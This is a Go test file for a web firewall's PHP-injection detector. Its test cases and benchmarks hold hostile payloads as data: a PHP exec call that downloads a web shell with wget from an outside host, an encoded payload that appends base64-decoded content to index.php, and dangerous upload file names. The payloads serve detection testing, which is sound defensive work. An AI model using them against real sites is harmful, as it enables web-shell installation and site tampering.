package php_attack

import (
	"github.com/corazawaf/coraza-proxy-wasm/wasmplugin/core"
	"reflect"
	"testing"
)

func TestMatchDefault(t *testing.T) {
	type testCase struct {
		value string
		want  bool //期望的计算结果
	}

	testGroup := map[string]testCase{
		"case933100-1": {"<?exec('wget%20http://r57.biz/r57.txt%20-O", true},
		"case933100-2": {"%3C%3Fphp%20echo(%5C%22KURWA%5C%22)%3B%20file_put_contents(%5C%22.%2Findex.php%5C%22%2C%20base64_decode(%5C%22Pz48aWZyYW1lIHNyYz0iaHR0cDovL3p1by5wb2Rnb3J6Lm9yZy96dW8vZWxlbi9pbmRleC5waHAiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiIGZyYW1lYm9yZGVyPSIwIj48L2lmcmFtZT48P3BocA%3D%3D%5C%22)%2C%20FILE_APPEND)%3B%20%3F%3E", true},
		"case933100-3": {"somePhpWouldGoHere%5B%2Fphp%5D", true},
		"case933100-4": {"somePhpWouldGoHere%5B%5Cphp%5D", true},
		//"case":         {"", true},
		"case933160-12": {`eval%0D%28%24foo%29`, true},
		"case933160-14": {`fopen%20%20%28blah%29`, true},
		"case933160-19": {`strREV%28%24x%29`, true},
	}

	for key, v := range testGroup { //遍历
		t.Run(key, func(t *testing.T) {
			tv := testTransformation(v.value)
			got := matchDefault(tv)
			want := v.want
			if !reflect.DeepEqual(want, got) { //比较
				t.Errorf("excepted:%v, got:%v", want, got)
			}
		})
	}
}

func TestFile(t *testing.T) {
	type testCase struct {
		value string
		want  bool //期望的计算结果
	}

	testGroup := map[string]testCase{
		"case933110-2":  {"a.php", true},
		"case933110-5":  {"a.php..", true},
		"case933110-6":  {"a.phtml", true},
		"case933110-7":  {"fda.phtml......", true},
		"case933110-8":  {"fda.php5", true},
		"case933110-17": {"fthi/sfewfda.php907.............", true},
		"case933110-23": {"dangerous.phar", true},
	}

	for key, v := range testGroup { //遍历
		t.Run(key, func(t *testing.T) {
			got := matchFile(v.value)
			want := v.want
			if !reflect.DeepEqual(want, got) { //比较
				t.Errorf("excepted:%v, got:%v", want, got)
			}
		})
	}
}

func testTransformation(value string) string {
	v, _, _ := core.UrlDecodeUni(value)
	return v
}

func BenchmarkPhpInjectRagel_test(b *testing.B) {
	testCases := [][]byte{
		[]byte("<?exec('wget%20http://r57.biz/r57.txt%20-O"),
		[]byte("%3C%3Fphp%20echo(%5C%22KURWA%5C%22)%3B%20file_put_contents(%5C%22.%2Findex.php%5C%22%2C%20base64_decode(%5C%22Pz48aWZyYW1lIHNyYz0iaHR0cDovL3p1by5wb2Rnb3J6Lm9yZy96dW8vZWxlbi9pbmRleC5waHAiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiIGZyYW1lYm9yZGVyPSIwIj48L2lmcmFtZT48P3BocA%3D%3D%5C%22)%2C%20FILE_APPEND)%3B%20%3F%3E"),
		[]byte("somePhpWouldGoHere%5B%2Fphp%5D"),
		[]byte("somePhpWouldGoHere%5B%5Cphp%5D"),
	}

	for i := 0; i < b.N; i++ {
		for _, testCase := range testCases {
			matchPhpInjection(testCase)
		}
	}
}

func BenchmarkPhpInjectRegex_test(b *testing.B) {
	//testCases := []string{
	//	"<?exec('wget%20http://r57.biz/r57.txt%20-O",
	//	"%3C%3Fphp%20echo(%5C%22KURWA%5C%22)%3B%20file_put_contents(%5C%22.%2Findex.php%5C%22%2C%20base64_decode(%5C%22Pz48aWZyYW1lIHNyYz0iaHR0cDovL3p1by5wb2Rnb3J6Lm9yZy96dW8vZWxlbi9pbmRleC5waHAiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiIGZyYW1lYm9yZGVyPSIwIj48L2lmcmFtZT48P3BocA%3D%3D%5C%22)%2C%20FILE_APPEND)%3B%20%3F%3E",
	//	"somePhpWouldGoHere%5B%2Fphp%5D",
	//	"somePhpWouldGoHere%5B%5Cphp%5D",
	//}
	//
	//for i := 0; i < b.N; i++ {
	//	for _, testCase := range testCases {
	//		rule_tasks.Re933100.MatchString(testCase)
	//	}
	//}
}
